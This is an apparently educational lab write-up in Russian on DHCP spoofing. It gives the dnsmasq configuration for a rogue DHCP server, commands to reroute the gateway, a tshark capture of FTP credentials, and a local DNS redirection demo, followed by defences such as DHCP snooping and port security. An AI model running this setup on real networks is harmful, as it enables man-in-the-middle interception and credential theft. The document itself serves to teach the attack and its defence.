📖 Теоретическая справка

DHCP (Dynamic Host Configuration Protocol) — это сетевой протокол, который автоматически назначает IP-адреса устройствам и передает им сетевые настройки (маску подсети, шлюз, DNS). Процесс получения адреса называется DORA.

Суть атаки DHCP Spoofing: В протоколе отсутствует механизм аутентификации сервера. Атакующий поднимает свой поддельный DHCP-сервер, который отвечает на запросы жертвы быстрее, чем легитимный роутер. В результате жертва принимает IP-адрес и шлюз, предложенные атакующим.

В качестве шлюза и DNS-сервера атакующий указывает свой IP-адрес. Это автоматически превращает его в центральную точку (Man-in-the-Middle), через которую проходит весь трафик жертвы.

⚙️ Хронология выполнения работы

1. Разведка и подготовка

Определен IP-адрес атакующего (192.168.1.106) и IP легитимного шлюза (192.168.1.1). Включен режим форвардинга.

ip -brief address show eth0
sudo sysctl -w net.ipv4.ip_forward=1

2. Настройка поддельного DHCP

Был использован dnsmasq. В конфигурации указан пул адресов и IP атакующего в качестве шлюза/DNS.

sudo bash -c 'cat > /etc/dnsmasq.conf << EOF
interface=eth0
dhcp-range=192.168.1.210,192.168.1.230,12h
dhcp-option=3,192.168.1.106
dhcp-option=6,192.168.1.106
EOF'
sudo dnsmasq --no-daemon --log-dhcp

3. Принудительная смена шлюза (Победа в гонке Offer)

Для демонстрации перехвата маршрут легитимного шлюза был удален, а новый прописан вручную на IP атакующего.

sudo ip route del default
sudo ip route add default via 192.168.1.106 dev eth0
ip route show | grep default
Флаг 2: Шлюз перенаправлен на атакующего

4. Перехват данных FTP

Запущен локальный FTP-сервер и сниффер трафика. При подключении пароль отображается в открытом виде.

python3 -m pyftpdlib -p 21 -u labuser -P Dhcp2026test -d /tmp
sudo tshark -i lo -Y ftp -T fields -e ftp.request.command -e ftp.request.arg
Флаг 3: Учетные данные перехвачены

5. Подмена DNS

Доказано, что домен test.local перенаправляется на локальный веб-сервер атакующего.

python3 -m http.server 80
curl -v http://test.local --resolve test.local:80:127.0.0.1
Флаг 4: DNS успешно подменен (ответ 200 OK)

В рамках домашнего задания требовалось проверить документацию или веб-интерфейс домашнего роутера на наличие функции DHCP Snooping.

Теоретически: В большинстве современных роутеров такая настройка находится в разделе «LAN» или «Безопасность» и по умолчанию чаще всего отключена.

В ходе работы были успешно захвачены все флаги:

Флаг 1 Разведка сети и IP
Флаг 2 Победа в гонке Offer
Флаг 3 Перехват FTP-трафика
Флаг 4 Подмена DNS через DHCP

Как защититься от DHCP Spoofing:

  • DHCP Snooping: настройка на управляемых коммутаторах.
  • Port Security: ограничение MAC-адресов на портах.
  • Статическая настройка: для критически важных серверов.
  • Мониторинг: отслеживание появления второго DHCP-сервера.
